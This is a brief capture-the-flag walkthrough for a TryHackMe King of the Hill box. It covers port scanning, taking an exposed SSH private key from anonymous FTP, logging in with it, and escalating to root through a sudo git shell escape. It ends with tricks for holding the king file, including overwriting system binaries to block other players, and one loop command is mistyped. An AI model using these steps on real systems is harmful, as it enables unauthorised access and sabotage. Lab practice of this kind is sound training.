# Try Hack Me THM Koth (Production)
- Scan the server
```bash
nmap -sC -sV IP.SERVER.ADDRESS
```
- show result that port `21,22,139,445...` is open there is something on FTP 
### Check FTP Server you will get 
```bash
flag.txt
id_rsa
authorized_keys
id_rsa.pub
```

- Look at `authorized_keys` or `id_rsa.pub` that user is `ashu@ubuntu`
- Change permission of file id_rsa to 400 `chmod 400 id_rsa`
- Then ssh to server `ssh -i id_rsa ashu@IP.SERVER.ADDRESS`
- After login you will have file on `/home/ashu` you will get the flag here.
- Check on `/home/skiddy/homework` there a file there you will get the password there `yxxxxxx!`

### Priviledge Escalation 
- From ashu user `sudo su skiddy` 
- After become skidy then look at the permission using sudo with `sudo -l`
- After that check on `https://gtfobins.github.io/` for sudo git 
- Using `:!/bin/bash` we will get root priviledges
- Congrat's you got the root ... and just find other flag.txt using `find / -name "*.txt" 2>/dev/null`

### Defending king.txt
- using this loop to change king.txt if other user change it. `while [ 1 ]; do  echo "anesthetistabove" - /root/king.txt ; sleep 0.1; done &` it will loop every 0.1 second
- Change `/bin/cat` `/bin/echo` to become other file, so other user can not use it ;) 